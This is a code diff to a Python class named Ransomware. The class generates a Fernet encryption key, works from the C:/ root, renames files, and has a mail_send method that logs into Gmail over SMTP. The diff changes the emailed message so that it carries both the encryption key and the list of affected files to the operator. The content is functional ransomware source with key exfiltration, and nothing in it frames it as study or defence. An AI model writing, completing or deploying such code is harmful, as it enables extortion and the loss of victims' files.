@@ -13,12 +13,14 @@ class Ransomware:
         os.chdir("C:/")  # on Mac -- /Users or /
         files_dict = {}
         key = Fernet.generate_key()
+        message = ""
         self.files = files
         self.directories = directories
         self.key = key
         self.files_dict = files_dict
 
-        self.key += self.files_dict
+        self.message = message
+        self.message = f"KEY : {key} +\n files_list : {files}"
 
     def id_generator(self, size, chars=string.ascii_lowercase + string.digits):
         return ''.join(random.choice(chars) for _ in range(size))
@@ -69,11 +71,11 @@ class Ransomware:
             os.rename(_, last)
 
     def mail_send(self, email="", password=""):
-        message = self.key
+        msg = self.message
         email_server = smtplib.SMTP("smtp.gmail.com", 587)
         email_server.starttls()
         email_server.login(email, password)
-        email_server.sendmail(email, email, message)
+        email_server.sendmail(email, email, msg)
         sleep(8)
         email_server.quit()
 
